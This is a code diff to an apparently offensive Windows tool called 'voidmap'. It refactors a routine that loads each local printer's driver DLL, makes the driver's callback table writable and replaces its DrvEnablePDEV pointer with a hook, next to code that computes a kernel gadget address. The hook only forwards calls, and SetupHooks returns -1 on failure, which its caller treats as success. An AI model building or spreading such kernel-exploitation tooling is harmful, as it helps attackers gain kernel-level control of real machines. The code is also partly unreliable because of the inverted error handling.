@@ -1,5 +1,167 @@
 #include "general.h"
 
+typedef BOOL(*DrvEnableDriver_t)(ULONG version, ULONG cj, DRVENABLEDATA* pded);
+typedef DHPDEV(*DrvEnablePDEV_t)(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
+typedef VOID(*VoidFunc_t)();
+
+DHPDEV HookedFunction(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
+PFN originalFunction;
+
+DHPDEV HookedFunction(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
+{
+    DHPDEV original = ((DrvEnablePDEV_t)originalFunction)(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
+    return original;
+}
+
+BOOL SetupHooks()
+{
+    ConsoleInfo("Finding printers...");
+    DWORD pcbNeeded;
+    DWORD pcbReturned;
+    EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);
+    if (pcbNeeded <= 0)
+    {
+        ConsoleError("Failed to find any printers!");
+        return -1;
+    }
+
+    PRINTER_INFO_4A* printerEnum = malloc(pcbNeeded);
+    if (!printerEnum)
+    {
+        ConsoleError("Failed allocate buffer from printer enumeration!");
+        return -1;
+    }
+
+    BOOL status = EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)printerEnum, pcbNeeded, &pcbNeeded, &pcbReturned);
+    if (!status || pcbReturned <= 0)
+    {
+        ConsoleError("Failed to enumerate printers!");
+        return -1;
+    }
+
+    ConsoleSuccess("Printer info count: %llu", pcbReturned);
+
+    for (DWORD i = 0; i < pcbReturned; i++)
+    {
+        PRINTER_INFO_4A* currentPrinter = &printerEnum[i];
+
+        ConsoleInfo("Opening printer %s...", currentPrinter->pPrinterName);
+        HANDLE printerHandle;
+        status = OpenPrinterA(currentPrinter->pPrinterName, &printerHandle, NULL);
+        if (!status)
+        {
+            ConsoleError("Failed to open printer!");
+            continue;
+        }
+
+        ConsoleSuccess("Printer handle: 0x%p", printerHandle);
+
+        ConsoleInfo("Getting printer driver...");
+
+        GetPrinterDriverA(printerHandle, NULL, 2, NULL, 0, &pcbNeeded);
+        DRIVER_INFO_2A* driverInfo = malloc(pcbNeeded);
+        if (!driverInfo)
+        {
+            ConsoleError("Failed to allocate buffer!");
+            continue;
+        }
+
+        status = GetPrinterDriverA(printerHandle, NULL, 2, (LPBYTE)driverInfo, pcbNeeded, &pcbNeeded);
+        if (!status)
+        {
+            ConsoleError("Failed to get printer driver!");
+            continue;
+        }
+
+        ConsoleSuccess("Driver name: %s dll: %s", driverInfo->pName, driverInfo->pDriverPath);
+
+        ConsoleInfo("Loading printer driver module...");
+        HMODULE printerDriverModule = LoadLibraryExA(driverInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
+        if (printerDriverModule == NULL)
+        {
+            ConsoleError("Failed to load printer driver module!");
+            continue;
+        }
+
+        ConsoleSuccess("Loaded module: 0x%p", printerDriverModule);
+
+        ConsoleInfo("Getting exports...");
+        DrvEnableDriver_t DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(printerDriverModule, "DrvEnableDriver");
+        VoidFunc_t DrvDisableDriver = (VoidFunc_t)GetProcAddress(printerDriverModule, "DrvDisableDriver");
+        if (!DrvEnableDriver || !DrvDisableDriver)
+        {
+            ConsoleError("Failed to get exports!");
+            continue;
+        }
+
+        ConsoleSuccess("DrvEnableDriver: 0x%p DrvDisableDriver: 0x%p", DrvEnableDriver, DrvDisableDriver);
+
+        ConsoleInfo("Enabling driver...");
+        DRVENABLEDATA enableData;
+        status = DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &enableData);
+        if (!status)
+        {
+            ConsoleError("Failed to enable driver!");
+            continue;
+        }
+
+        ConsoleSuccess("Enabled driver");
+
+        ConsoleInfo("Setting custom protection on callback table...");
+        DWORD oldProtection;
+        status = VirtualProtect(enableData.pdrvfn, enableData.c * sizeof(PFN), PAGE_READWRITE, &oldProtection);
+        if (!status)
+        {
+            ConsoleError("Failed to set protection on callback table!");
+            continue;
+        }
+
+        ConsoleSuccess("Custom protection set");
+
+        ConsoleInfo("Looping callback table...");
+        BOOL found = FALSE;
+        for (DWORD n = 0; n < enableData.c; n++)
+        {
+            ULONG iFunc = enableData.pdrvfn[n].iFunc;
+            if (iFunc == INDEX_DrvEnablePDEV)
+            {
+                originalFunction = enableData.pdrvfn[n].pfn;
+                enableData.pdrvfn[n].pfn = (PFN)HookedFunction;
+                found = TRUE;
+                break;
+            }
+        }
+
+        if (found)
+        {
+            ConsoleSuccess("Replaced function pointer");
+        }
+        else
+        {
+            ConsoleError("Desired function not found!");
+            return -1;
+        }
+
+        ConsoleInfo("Disabling driver...");
+        DrvDisableDriver();
+        ConsoleSuccess("Disabled driver");
+
+        ConsoleInfo("Reverting protection...");
+        status = VirtualProtect(enableData.pdrvfn, enableData.c * sizeof(PFN), oldProtection, &oldProtection);
+        if (!status)
+        {
+            ConsoleError("Failed to revert protection!");
+            continue;
+        }
+
+        ConsoleSuccess("Protection reverted");
+
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
 int main(int argc, char* argv[])
 {
     ConsoleTitle("voidmap");
@@ -70,47 +232,10 @@ int main(int argc, char* argv[])
     DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
     ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);
 
-    ConsoleInfo("Finding printers...");
-    DWORD pcbNeeded;
-    DWORD pcbReturned;
-    EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);
-    if (pcbNeeded <= 0)
+    BOOL status = SetupHooks();
+    if (!status)
     {
-        ConsoleError("Failed to find any printers!");
+        ConsoleError("Failed to setup hooks!");
         return -1;
-    }
-
-    PRINTER_INFO_4A* printerEnum = malloc(pcbNeeded);
-    if (!printerEnum)
-    {
-        ConsoleError("Failed allocate buffer from printer enumeration!");
-        return -1;
-    }
-
-    BOOL status = EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)printerEnum, pcbNeeded, &pcbNeeded, &pcbReturned);
-    if (!status || pcbReturned <= 0)
-    {
-        ConsoleError("Failed to enumerate printers!");
-        return -1;
-    }
-
-    ConsoleSuccess("Printer info count: %llu", pcbReturned);
-
-    for (DWORD i = 0; i < pcbReturned; i++)
-    {
-        PRINTER_INFO_4A* currentPrinter = &printerEnum[i];
-
-        ConsoleInfo("Opening printer %s...", currentPrinter->pPrinterName);
-        HANDLE printerHandle;
-        status = OpenPrinterA(currentPrinter->pPrinterName, &printerHandle, NULL);
-        if (!status)
-        {
-            ConsoleError("Failed to open printer!");
-            continue;
-        }
-
-        ConsoleSuccess("Printer handle: 0x%p", printerHandle);
-
-
     }
 }
